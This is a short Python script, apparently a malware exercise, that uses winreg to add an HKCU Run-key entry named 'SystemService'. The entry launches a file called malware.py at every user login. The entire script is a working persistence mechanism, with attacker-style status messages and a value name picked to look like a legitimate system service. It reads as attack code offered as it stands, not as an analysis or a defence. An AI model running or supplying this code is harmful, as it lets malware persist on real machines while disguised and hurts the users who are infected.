import os
import winreg as reg

def add_to_registry():
    # Registry path
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    reg_name = "SystemService"
   
    python_exe = r"C:\Users\Test 1\AppData\Local\Programs\Python\Python310\python.exe"  
    script_path = r"C:\Users\Test 1\Documents\project_folder\malware.py"

    # Full command to execute at startup
    reg_value = f'"{python_exe}" "{script_path}"'

    try:
        # Open the registry key
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_path, 0, reg.KEY_SET_VALUE)
        
        # Set the new value
        reg.SetValueEx(reg_key, reg_name, 0, reg.REG_SZ, reg_value)
        
        reg.CloseKey(reg_key)
        
        print("[+] Persistence established successfully.")
    except Exception as e:
        print(f"[-] Failed to add persistence: {e}")

# Execute the persistence function
add_to_registry()
